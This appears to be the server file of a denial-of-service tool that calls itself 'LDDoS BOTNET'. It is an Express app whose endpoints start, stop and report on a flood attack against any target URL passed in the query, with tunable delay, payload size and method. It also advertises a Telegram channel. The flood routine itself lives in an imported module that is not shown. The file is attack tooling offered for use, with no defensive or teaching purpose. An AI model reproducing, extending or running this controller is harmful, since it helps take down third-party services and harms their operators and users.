const express = require('express');
const app = express();
const path = require('path');
const attack = require('./attack');

const PORT = process.env.PORT || 5252;

app.use(express.static(path.join(__dirname, '../public')));

let isAttackRunning = false;

app.get('/attack', (req, res) => {
    const { target, delay, kbSize, method } = req.query;
    const delayMs = delay === 'Z' ? 0 : parseInt(delay, 10);
    const kb = parseInt(kbSize, 10);

    if (!isAttackRunning) {
        isAttackRunning = true;
        attack.start(target, delayMs, kb, method);
        res.send('Attack started!');
    } else {
        res.send('Attack is already running.');
    }
});

app.get('/stop-attack', (req, res) => {
    if (isAttackRunning) {
        isAttackRunning = false;
        attack.stop(); 
        res.send('Attack stopped!');
    } else {
        res.send('No attack is running.');
    }
});

app.get('/attack-status', (req, res) => {
    res.send(isAttackRunning ? 'Attack is running...' : 'Attack is stopped.');
});

app.listen(PORT, () => {
    console.log(`LDDoS BOTNET running on port ${PORT}`);
    console.log(`Telegram channel: https://t.me/biosmosntr`);
});
